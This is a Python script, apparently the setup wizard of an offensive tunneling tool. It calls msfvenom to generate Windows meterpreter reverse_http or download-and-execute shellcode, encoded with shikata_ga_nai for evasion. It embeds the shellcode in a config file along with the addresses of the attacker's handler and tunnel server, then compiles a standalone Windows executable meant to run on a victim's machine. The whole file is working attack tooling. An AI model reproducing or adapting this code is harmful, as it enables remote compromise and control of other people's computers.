#!/usr/bin/env python

import os, random, string
from subprocess import *

def pyinstaller_compile(file_location):
    pyinstall_command = "wine ~/.wine/drive_c/Python27/python.exe /usr/share/pyinstaller/pyinstaller.py  --onefile "
    #--noconsole
    os.system(pyinstall_command + file_location)

#def clean_up:
    #mkdir dist
    #copy pyinstaller dist exe to current dist
    #create 
def random_secret(length):

    chars = string.ascii_letters + string.digits + '!@#$%^&*()'

    rnd = random.SystemRandom()
    return ''.join(rnd.choice(chars) for i in range(length))

def create_reverse_http(lhost,lport):

    msfvenom = (" msfvenom -p windows/meterpreter/reverse_http LHOST=" + lhost + " LPORT=" + lport + " -e x86/shikata_ga_nai -i 3 -f c")
    msfhandle = Popen(msfvenom, shell=True, stdout=PIPE)
    try:
        shellcode = msfhandle.communicate()[0].split("unsigned char buf[] = ")[1] 
        shellcode = shellcode.replace (';','').strip()
    except IndexError:
        print "Error: Do you have the right path to msfvenom?"
        raise
    
    return shellcode


def create_download_execute(exe,url):

    msfvenom = (" msfvenom -p windows/download_exec EXE=" + exe + " URL=" + url + " -e x86/shikata_ga_nai -i 3 -f c")
    msfhandle = Popen(msfvenom, shell=True, stdout=PIPE)
    try:
        shellcode = msfhandle.communicate()[0].split("unsigned char buf[] = ")[1] 
        shellcode = shellcode.replace (';','').strip()
    except IndexError:
        print "Error: Do you have the right path to msfvenom?"
        raise
    
    return shellcode
def write_config_file(aes_secret,listen_port,target_port,target_addr,tunnel_addr,tunnel_port,shellcode,cert_file):
    config_file = open('config/user_config.py', 'w')    
    code = "#!/usr/bin/env python\r\n"
    code += "\r\n"
    code += "#listner port for metasploit to talk too\r\n"
    code += "listen_port = " + listen_port + "\r\n" 
    code += "#target address and port of the handler\r\n"
    code += "target_addr = {\'host\':\'" + target_addr +"\' ,\'port\': \'" + target_port + "\'}\r\n"
    code += "remote_addr = {\'host\':\'" + tunnel_addr +"\' ,\'port\': \'" + tunnel_port + "\'}\r\n"
    code += "proxy_addr = {}\r\n"
    code += "\r\n\r\n\r\n"
    code += "shellcode = bytearray(\r\n"
    code += shellcode
    code += ")\r\n"
    config_file.write(code)
    config_file.close()
    config_file = open('config/aes_share.py','w')
    code = "#!/usr/bin/env python\r\n"
    code += "secret = \"" + aes_secret +"\"\r\n"
    config_file.write(code)
    config_file.close()
#    config_file = open('config/tunneld_config.py')
 #   code = "#!/usr/bin/env python\r\n"
  #  code += "cert file = " + cert_file
   # config_file.write(code)
   # config_file.close()



              

print "welcome to tunnel wizard"



AES = -1
while AES == -1:
    print "Please choose:"
    print " 1. New AES String"
    print " 2. Reused AES String"
    AES = raw_input('---->')

if AES == "1":
    aes_secret = random_secret(16) 
if AES == "2":
    print "Please enter AES secret"
    aes_secret = AES = raw_input('---->')

print "Listen port for client tunnel on victim:"
listen_port = raw_input('---->')

print "Host is tunneld running on:"
tunneld_addr = raw_input('------>')

print "Port is tunneld running on:"
tunneld_port = raw_input ('----->')

print "Address of metasploits multi handler:"
multi_addr = raw_input ('----->')

print "Port the handler on (make unqiue from tunnel local port):"
multi_port = raw_input ('----->')


embed = "-1"

while embed == "-1":
    print "Please choose:"
    print "1. Embed metasploit stager"
    print "2. Download and execute"
    embed = raw_input ('----->')

if embed == "1":
        stage_ip = "127.0.0.1"
        shellcode = create_reverse_http(stage_ip,listen_port)        

if embed == "2":
    print "Url to download stager:"
    stage_url = raw_input ('----->')
    print "Exe name to save and run on target system"
    stage_exe = raw_input ('----->')
    shellcode = create_download_execute(stage_exe,stage_url)

new_cert = "-1"
while new_cert == "-1":
	print "Please choose:"
	print "Y/N New generate new ssl cert?"
	new_cert = raw_input ('----->')
if not new_cert == "N":
	os.system("openssl req -x509 -newkey rsa:2048 -keyout config/key.pem -out config/temp.pem -days 9999 -nodes")
	os.system("cat config/key.pem config/temp.pem > config/cert.pem")

write_config_file(aes_secret,listen_port,multi_port,multi_addr,tunneld_addr,tunneld_port,shellcode,'config/cert.pem')    
    
pyinstaller_compile('tunnel.py')
    
    
